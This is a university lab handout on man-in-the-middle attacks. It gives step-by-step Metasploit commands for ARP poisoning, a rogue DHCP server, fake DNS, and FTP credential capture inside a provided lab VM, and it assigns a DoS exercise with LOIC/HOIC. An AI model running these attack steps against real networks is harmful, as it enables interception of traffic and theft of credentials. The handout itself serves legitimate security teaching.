---
title: "Lab 05"
author: "Constantine Macris"
date: "24SEPT2020"
subject: "Network Lab"
subtitle: "Don't drop the packet"
titlepage: true
titlepage-color: "3C9F53"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
top-level-division: chapter
---
# Lab 05 MITM Lab

## Learning Outcomes

* Practice security techniques
* Execute ARP Poisoning
* Execute DNS Poisoning

## Definitions

* MitM -- man-in-the-middle
* DoS -- denial-of-service
* APT -- advanced persistent threat

## References

* Wireshark for Security Professionals: Using Wireshark and the Metasploit Framework -- Jessey Bullock,Jeff T. Parker
  * Chapter 5

## Introduction

Today in lab we will be combining everything we have been learning about networks and kick off our work in security. Today we will be observing three scenarios: man-in-the-middle (MitM), denial-of-service (DoS) and advanced persistent threat (APT). To investigate these attacks will offer insight into new attacks that will not be specifically covered and give you insight into how to use the tools you have available to you.

* Take a moment to review a brief overview of the [Wireshark GUI](https://networksecuritytools.com/wireshark-interface-gui-overview/)
* Also once you kick off your VM download please read Chapter 5 from Wireshark for Security Professionals: Using Wireshark and the Metasploit Framework


### MitM

As you can imagine when you are involved in a MitM attack you are... in the middle. When you are in the middle you get to see everything that is moving between the two points. So how can we get in the middle? One way, would be to take advantage of ARP caching. We can let a switch know who we are before it needs to ask which in turn will 

## Starting Lab Environment

### Obtaining the Lab VM

We will be using Vagrant and Virtualbox to install the VM from Vagrant Cloud. Please select your operating system and use that to setup the rest of your environment

#### Windows

1. Download and install [VirtualBox](https://www.virtualbox.org/wiki/Downloads)
2. Download and install [Vagrant](https://www.vagrantup.com/downloads.html)
3. Enter Powershell and run

```powershell
mkdir lab05/
cd lab05
vagrant init thedini/w4sp
vagrant up
```

#### Linux (Ubuntu)

1. Download and install [VirtualBox](https://www.virtualbox.org/wiki/Downloads) or

```bash
sudo apt install virtualbox
```

2. Download and install [Vagrant](https://www.vagrantup.com/downloads.html)

```bash
wget https://releases.hashicorp.com/vagrant/2.2.7/vagrant_2.2.7_x86_64.debs
sudo dpkg -i vagrant_2.2.7_x86_64.deb
```

3. Enter Terminal and run

```bash
mkdir lab05
cd lab05/
vagrant init thedini/w4sp
vagrant up
```

### If Vagrant doesn't work

1) Download https://cga.sfo2.digitaloceanspaces.com/w4sp_default_1600794664250_35662.ova
2) Open vitrualbox and click file, import appliance (Crtl+I)
3) Select the downloaded ova file and import it.


### Startup the VM

1) Start the VM called w4sp-lab if it has not already started, you may need to open VirtualBox to open the Window.
2) Log into the vm with the following credentials

```bash
user: w4sp-lab
pass: cns2020
```
3) **On your host**  Open command prompt as administrator <br>
`bcdedit /set hypervisorlaunchtype off` <br>

4) If this has an error do the following <br>
`vagrant halt` <br>
reboot computer

5) Allow your user to access Wireshark with `sudo usermod -a -G wireshark $USER`
6) If you get an error saying `usermod: group 'wireshark' does not exist` enter the command: `sudo dpkg-reconfigure wireshark-common` 
Then select Yes and enter `sudo usermod -a -G wireshark $USER`
7) **Logout or restart and log back in to let the account changes take effect**
8) I find adjusting the resolution helps: Inside the VM hit the super-key, type display and set to something like 1440x900
9) Inside the VM you will need to startup the environment, right click and select "terminal" to open a terminal. Once in the terminal issue the following commands:

```bash
cd /home/w4sp-lab/lab
sudo python3 w4sp_webapp.py
```

**NOTE: Do not close the terminal window, you need it open to continue to run the lab environment**

10) Allow the system to startup and open the browser once the terminal reads

```bash
Error: no DISPLAY environment variable specified
```

11) Go to 127.0.0.1:5000 in the VM web browser -- a web interface will open to control the lab. Click the red **"Setup"** button.
12) Allow the environment to build for a few moments. Once it is complete the terminal will stop scrolling and you can refresh the page and you should see a topology appear!!!

## ARP MitM Attack

### Start Metasploit

1) Open a new terminal
2) Launch Metasploit as root using `sudo msfconsole`
3) Confirm you are in the Metasploit interpreter by typing `help`

### Start the ARP MitM Attack

1) type `use auxiliary/spoof/arp/arp_poisoning` into the msf prompt (you can use tab complete) and hit enter.
2) view options for the module with `show options`

Take a look at the fields in the options. There are a number of required fields we need to enter including DHOSTS which are the target IP addresses and the SHOTS which are the spoofed IP addresses.

3) view advanced options with `show advanced`

Here you will find more required settings like LOCALSIP for local IP addresses

4) Open a new terminal and find your default gateway with `sudo route -n` Mine is **192.168.200.1** note yours for the report.
5) Find your IP address with `ip addr` mind is **192.100.200.164** again save this for later
6) Find all your MAC addresses with `ip neigh`
6) Confirm this information by hovering over the nodes on the web browser interface!
6) Lets put together the data for the attack in a table mine looks something like this:

| Setting  | Description | System          | IP Address      | MAC               |
|----------|-------------|-----------------|-----------------|-------------------|
| DHOSTS   | Target      | vic1            | 192.100.200.155 | 86:65:a9:85:96:08 |
| SHOSTS   | Spoofed IP  | default Gateway | 192.100.200.1   | 00:00:5e:00:01:ee |
| LOCALSIP | Local IP    | Kali/Metasploit | 192.168.200.104 | be:27:3a:e6:7c:c9 |

8) Return to Metasploit and set the target IP address by setting DHOSTS by entering `set DHOSTS 192.100.200.155` **NOTE: Your IP may be different**
9) Set the place you want to spoof by setting the SHOSTS by entering `set SHOSTS 192.100.200.1`
10) Finally set your local IP by setting the LOACLSIP with `set LOCALSIP 192.168.200.104`

### VIC1 ARP MitM Exploit

Once your settings are complete it is time to fire up Wireshark and start the exploit. Lets rock!

1) Start Wireshark, you should select your network interface **w4sp-lab** is normally default
2) Return to your Metasploit terminal and launch the exploit with `exploit`
3) Back at Wireshark  you should start to see packages stream by the terminal!
4) Filter the results by entering `arp` in the Filter Toolbar
  * What do we see happening?
5) Pivot from the `arp` filter to filtering based on the vic1 IP address.
  * What is the filter you are using?
  * What do you see happening

### Rerouted FTP packets

1) Rest your Filter Toolbar by entering `ftp` to view ftp packets
  * What do you see happening here?
  * If you did not poison the ARP would you be able to see this?
2) Look at the packets to identify what may be useful to find, as an attacker of course
3) Note any interesting data you find during this part of the capture

Once you have gathered the information you are looking for as an attacker you have a few options. You can continue relaying the information by rerouting the packets to their intended destination, you can re-poison with the correct address, or you can just allow the ARP cache to grow stale.

  * Think about how you might relay the traffic.

### Don't get caught

1) With you capture still going and your attack on going cancel your attack with `ctrl-c` in the Metasploit window
2) Metasploit will stop spoofing the ARP and broadcast the correct ARP, lets see if we can find that!

A feature of Wireshark is the Expert Information it provides. This feature is located under the **Analyze** section of the Main Menu. As you can see Wireshark has established something fishy is going on.

At this point you can stop your capture in Wireshark (save it for use in your report) and exit out of Metasploit. You can leave your **w4sp-lab webapp running** if you closed it go back to [Startup the VM](Startup the VM) section and restart the python application and click **Setup**.

## DNS MitM Attack

In a nutshell Domain Name System (DNS) is the system responsible for resolving names to IP addresses. The details have been covered in the reading. It is what provides the IP address for *macris.co* when you want to visit the coolest GitLab server this side of the Mississippi. DNS works on both TCP and UPD and like ARP there is normally a DNS cache on the host and local DNS server. The fewer times you need to resolve the IP address the quicker the service can be.

### DNS Spoofing

What happens if an attacker is able to manipulate the DNS traffic. For example, if you want to go to log into USAA to get that Cadet Loan to blow on a fancy car. An attacker also wants a a fancy car and decides to make USAA's site(normally 23.218.120.187) a little better like this:

![USAA FAKE](https://cga.sfo2.digitaloceanspaces.com/cns/images/default-1024x851.png)

The only difference is that the URL is actually *USAA.com*. Your cadet loan is now the attackers cadet loan! For this attack to work we are going to take advantage of the ability of Metasploit to create a fake DHCP server. If you recall *"Class 10 Network Layer"* is covered and has the following sets:

* Client sends discovery broadcast, "HELLO any DHCP servers"
* DHCP server sends an offer to the client, "Hi! want an IP address?"
* Client replies with a request, "Great I'll take it"
* DHCP server acknowledges, "You got it!"

In this case we are going to be the DHCP server and we are going to give our own IP address as the DNS server!

### Launch Metasploit DHCP Server

First we need to make a **Fake DHCP Server**:

1) Reference your IP address or check it again with `ip addr`, note it as before
2) Launch Metasploit framework again with `sudo msfconsole`
3) Select the DCHP service with `use auxiliary/server/dhcp`
4) Look at options with `show options` note the options, we will be setting `DNSSERVER`, `NETMASK` and `SRVHOST`
5) Set `DNSSERVER` and `SRVHOST` to your IP address, in my case I would use `set DNSSERVER 192.168.200.164` and `set SRVHOST 192.168.200.164`
6) Set `NETMASK` to 255.255.255.0 with `set NETMASK 255.255.255.0`
7) Fire up your DHCP server by entering `exploit`

### Configure Metasploit DNS server

We continue to build our network infrastructure with Kali Linux by configuring our **Fake DNS Server**. By the time we are finished here we will have an entire hacked network in a single VM! We are going to be setting up our DNS to target the FTP1 server, domain name FTP1.labs

1) In Metasploit select the fake DNS module with `use auxiliary/server/fakedns`
2) We will be setting `TARGETACTION`, `TARGETDOMAIN` and `TARGETHOST`
3) Set `TARGETHOST` to your system, in my case `set TARGETHOST 192.168.200.164`
4) Set `TARGETDOMAIN` to the domain we want to resolve, in this case lets set it to the FTP server. For me `set TARGETDOMAIN 192.168.200.166`
5) Set `TARGETACTION` will set the DNS behavior, we want to set it to `FAKE` with `set TARGETACTION FAKE` (if you are testing this module you can use `BYPASS` as opposed to `FAKE` to simply view and forward to a legit DNS server)
6) Launch the exploit as we have with `exploit` and watch the DNS queries pour in. You will note that you are in `BYPASS` for all queries other than those for LAB1, which get pointed to your Kali IP. This is too much information, lets quiet it down.
7) Press Ctrl+C to interrupt the screen
8) List the active `msfconsole` jobs with `jobs -l`
9) Kill the `fakedns` job with `jobs -k 1` (where #1 is the Job ID for `fakedns`)
10) Restart the exploit with `exploit -q`

### DNS requests coming in

Lets now watch the DNS entries start pouring in via Wireshark. Take a moment to poke around in Wireshark to (or restart your capture) to confirm that you are responding to DHCP requests as well as getting DNS traffic. Confirm that for DNS queries for `ftp1.labs` your host IP address is being returned. **Take a screenshot to include in your report**

### Give the people what they want, an FTP server

We are now getting FTP requests because of our DNS poisoning. This would be a great opportunity to capture some user credentials by giving them a place to login. Lucky for us the Metasploit FTP module defaults will work for our purposes.

1) In Metasploit select the FTP module with `use auxiliary/server/capture/ftp`
2) Launch the FTP server with `exploit`
3) Within seconds you should see some FTP credentials come through.



## Lab Evaluation

### Questions D2L Quiz

Include responses, and screen shots to exhibit your answers.

* What is your version of Metasploit Framework?
* What is your VM's default gateway?
* What is your IP address?
* During the ARP attack what did we observe?
* What data did you find while viewing FTP packets after the ARP exploit?
* What helps the end user determine the USAA site is a false one?
* How would you prevent ARP Poisoning?
* How could you mitigate DHCP snooping?
* During the ARP Poisoning what was the FTP password from vic1?
* Design a display filter that will help you see DHCP request and response traffic for when another machine first connects to the network.

### Build An Attack

With a partner build a webserver VM and an attacker VM to show a DoS attack:

Download and test a DDoS tool, such as HOIC or LOIC (from a VM). Use it against a web server you own (another VM). Experiment with web service parameters and monitoring performance. What are the first packets shown in Wireshark from the attacking VM? If you'd like to learn more about DoS attacks and some of the free tools available, try this link: https://resources.infosecinstitute.com/dos-attacks-free-dos-attacking-tools/.

Build your boxes (Webserver and attack box) with Vagrant using the Vagrantfile to configure a base OS of your choice. Be sure to configure networking, installed packages and services so your environment is ready to run with "Vagrant Up". Be prepared to present your attack simulation before Thanksgiving break! Submit your Vagrantfiles to the **"Lab 05 Dropbox"** as well as to the GitHub repo https://github.com/macee/cns-2020f.

Download and examine some of the APT packet captures from Deepend Research or other online sources. Share with your peers what you've learned and where you found it in the #class_discussion page. Please provide at least one post and two responses where you verify another students work and provide comments and opinion.  
